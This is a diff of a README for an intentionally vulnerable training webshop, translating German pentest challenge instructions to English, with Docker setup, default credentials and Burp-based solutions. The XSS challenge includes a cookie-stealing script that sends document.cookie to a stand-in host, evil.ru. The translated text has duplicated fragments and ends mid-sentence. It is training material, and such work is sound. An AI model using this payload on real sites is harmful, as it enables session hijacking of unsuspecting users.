@@ -1,103 +1,91 @@
 [![Docker](https://github.com/BenjiTrapp/Project-Makalu/actions/workflows/docker-publish.yml/badge.svg)](https://github.com/BenjiTrapp/Project-Makalu/actions/workflows/docker-publish.yml)
 
 # Project [Makalu](https://de.wikipedia.org/wiki/Makalu) - An unsecure Webshop with an intentional broken Session Handling
-Im Zuge des neuen Online Shops der **anna group** wird auch ein neues Session Handling benötigt. Der hier vorliegende 
-Code steht kurz vor dem produktiven Livegang. Trotz der rapiden Entwicklung machen sich erhebliche Zweifel breit, ob
- nicht etwas wichtiges vergessen wurde?
+In the course of the new online store of the **anna group** a new session handling is needed. The code presented here 
+code is about to go live. In spite of the rapid development there are doubts whether
+ something important has been forgotten?
 
 ### Motivation
-Moderne WebApps verfügen teilweise über eine enorme Komplexität. Um den Kunden vor mögliche Angriffe zu schützen, benötigen unter anderem Requests die an eine WebApp gestellt werden eine Login-Session. Ein Request benötigt üblicherweise die Daten aus einer 
-vorherigen Response (bspw. CSRF tokens). Die empfangenen Daten in einem Teilrequest, können auch einige Requests später noch 
-benötigt werden wie zum Beispiel während des Checkout Prozesses. Dies macht den Einsatz von "unique" Namen/IDs während der Erstellung eines Requests notwendig. 
+Modern WebApps sometimes have an enormous complexity. In order to protect the customer from possible attacks, among other things, requests made to a WebApp require a login session. A request usually requires the data from a previous 
+previous response (e.g. CSRF tokens). The data received in a partial request may also be needed some requests later, e.g. during checkout. 
+such as during the checkout process. This makes the use of "unique" names/IDs during the creation of a request necessary. 
  
-**Randbemerkung**: Das Fuzzing bspw. im Kontext eines CSRF tokens, erzeugt eine Vielzahl von Daten sowie Aufrufe innerhalb der WebApplikation. Dadurch kann im Falle eines Angriffs, die Performance der gesamten Applikation beeinträchtigen. Die Performance selbst,
-steht in diesem Penetrationtests NICHT im Fokus, kann aber je nach gewählter Fuzzing-Methode zu einem "Problem" für den Angriff werden. 
+**Remark**: Fuzzing e.g. in the context of a CSRF token, generates a lot of data as well as calls within the WebApplication. This can affect the performance of the entire application in the event of an attack. The performance itself,
+is NOT the focus of this penetration test, but can become a "problem" for the attack, depending on the chosen fuzzing method. 
 
-## Problemstellung:
- Helfe der **anna group** durch einen Penetrationtest die Sicherheit des Session Handlings zu prüfen. Um diesen Wunsch
- nachzukommen muss zunächst die Applikation installiert und betriebsbereit gemacht werden. Hierbei hilft 
- sicherlich folgende Anleitung weiter:
+## Problem Statement:
+ Help the **anna group** to test the security of the session handling through a penetration test. To fulfill this request
+ the application must first be installed and made operational. Here helps 
+ the following instructions will certainly help:
  
-## Installation & starten der WebApp
-1. mittels Docker
+## Install & launch the WebApp
+1. using Docker
      ```
      1. ``$ docker pull nyctophobia/project-makalu``
      2. ``$ docker run -d -p 4711:4711 nyctophobia/project-makalu``
-     3. Öffne im Browser: "http://localhost:4711"
+     3. open in browser: "http://localhost:4711"
      ```
-2. mittels Docker Compose
+2. Using Docker Compose
      ```
-     1. Git repository pullen von GitHub (git pull https://github.com/BenjiTrapp/Project-Makalu.git)
-     2. In das Verzeichnis Wechseln
+     1. pull Git repository from GitHub (git pull https://github.com/BenjiTrapp/Project-Makalu.git)
+     2. change to the directory
      3. ``docker-compose up``
-     4. Öffne im Browser: "http://localhost:4711"
+     4. open in browser: ``http://localhost:4711``
      ```
-3. Lokal in der IDE
+3. locally in the IDE
      ```
-     1. Die Datei https://github.com/BenjiTrapp/Project-Makalu/blob/master/ProjectMakaluApp.py editieren: 
-            Host in der Main Methode von 0.0.0.0 auf 127.0.0.1 abändern
-     2. Editierte Main-Methode starten in der IDE z.B. PyCharm
+     1. edit the file https://github.com/BenjiTrapp/Project-Makalu/blob/master/ProjectMakaluApp.py: 
+            Change host in main method from 0.0.0.0 to 127.0.0.1. 2.
+     2. start edited main method in IDE e.g. PyCharm
      ```
 
-#####  [Credentials](https://www.heise.de/security/meldung/hallo-ist-meistgenutztes-deutsches-Passwort-auf-Platz-zehn-steht-ficken-3579567.html): user/hallo
+##### [Credentials](https://www.heise.de/security/meldung/hallo-ist-meistgenutztes-deutsches-Passwort-auf-Platz-zehn-steht-ficken-3579567.html): user/hallo
 
-## Durchführung des Penetrationtests
-Für den Test existiert folgende Use Cases. Zur Durchführung des Penetrationtests kann das File 
-"/doc/Burp.burp-projectopts.json" mittels [Burp](https://portswigger.net/burp/freedownload/) als Projekt 
-geladen werden. In der JSON-Datei sind alle "session handling rules" enthalten, um die nachfolgenden Challenges
-zu lösen. Die Challenges können natürlich auch mit anderen Tools wie bspw. OWASP ZAP gelöst werden.
+## Execution of the penetration test
+The following use cases exist for the test. To perform the penetration test the file 
+"/doc/Burp.burp-projectopts.json" can be loaded as a project using [Burp](https://portswigger.net/burp/freedownload/). 
+can be loaded. The JSON file contains all session handling rules to solve the following challenges.
+to solve. The challenges can of course also be solved with other tools such as OWASP ZAP.
 
-#### Use Case: Bau dir einen eigenen CSRF Token
+#### Use Case: Build your own CSRF token
 ```
-[Challenge]: Der Übertragene CSRF Token muss übereinstimmen und mit jedem POST Request übertragen werden
+[Challenge]: The transmitted CSRF token must match and be transmitted with every POST request.
 
-[Lösung]:
-* Capture des Requests von einem bestehenden CSRF Token
-* Erstelle eine "Run a Macro" session handling Regel
-    * Der Scope liegt auf den Parameter des CSRF Tokens
-    * Update den CSRF Token NUR im aktuell gestellten Request
+[Solution]:
+* Capture the request from an existing CSRF token.
+* Create a "Run a Macro" session handling rule
+    * Scope the CSRF token parameters.
+    * Update the CSRF token ONLY in the currently submitted request.
 ```
 
-#### Use Case: Übernehme die Session eines anderen Users mittels [XSS-Lücke](https://www.owasp.org/index.php/Testing_for_Cross_site_scripting)
+#### Use Case: Take over another user's session using [XSS gap](https://www.owasp.org/index.php/Testing_for_Cross_site_scripting)
 
 ```
-[Challenge]: Finde ein Eingabefeld, dass eine XSS-Lücke enthält und klaue damit die Session eines ahnungslosen Opfers
+[Challenge]: Find an input field that contains an XSS vulnerability and use it to hijack an unsuspecting victim's session.
 
-[Lösung]:
-* Platziere an einer geeigneten Stelle ein inline JavaScript wie beispielsweise: 
+[Solution]:
+* Place inline JavaScript in a suitable location such as: 
     <script>window.location="http://evil.ru/?cookie=" + document.cookie;</script> 
-* Extrahiere den erbeuteten Cookie aus dem Request und übernehme die Session 
+* Extract the captured cookie from the request and take over the session. 
 ```
 
-#### Use Case: Behalte die Login-Session offen
+#### Use Case: Keep the login session open
 ```
-[Challenge]: Mit einer Wahrscheinlichkeit von 5% beenden WebApplikationen die Login-Session
+[Challenge]: With a probability of 5%, WebApplications terminate the login session.
 
-[Lösung]:
-* Capture des Login-Requests in einem Makro
-* Erstelle eine "Check Session is Valid" Regel
-    * Erstelle einen Request
-    * Prüfe den Response-Body nach einem Benutzernamen für die gültige Session
-    * Alternativ: Prüfe die Umleitung der Login-URL (die Session muss für diesen Fall invalide sein)
-    * Spiele das aufgezeichnete Makro ab bei der Invalidierung der Session
+[Solution]:
+* Capture the login request in a macro.
+* Create a "Check Session is Valid" rule
+    * Create a request
+    * Check the response body for a username for the valid session
+    * Alternatively, check the redirection of the login URL (the session must be invalid for this case)
+    * Play the recorded macro when the session is invalidated
 ```
     
-#### Use Case: Begehe Bestellbetrug 
+#### Use Case: commit order fraud 
 ```
-[Challenge]: Führe multiple Requests durch bis die finale Bestellbestätigung erscheint
+[Challenge]: Perform multiple requests until the final order confirmation appears.
 
-[Lösung]:
-* Führe alle Requests durch bis einer mit Hilfe eines Makros gefuzzed werden kann.
-* Finalisiere den Bestellbetrug mit einem "Run a Post-Request Macro", dass den aktuellen Request zurück gibt
-* Definiere einen engen Definitionsbereich (URL, Parameter)
-```
-
-#### Use Case: Löschen von Eingefügten Daten
-```
-[Challenge]: Aktuell sind nur drei Einträge erlaubt. Um dies etwas gerechter zu machen, soll die "add" 
-Funktionalität gefuzzed werden
-
-[Lösung]:
-* Lösche nachträglich gerade hinzugefügte Notizen 
-    * Erstelle ein POST-request Makro, dass die Object ID extrahiert und anschließend den Löschvorgang anstößt.
-```
+[Solution]:
+* Perform all requests until one can be fuzzed using a macro.
+* Finalize the order fraud with a "Run a Post-Request Macro", that will confirm the
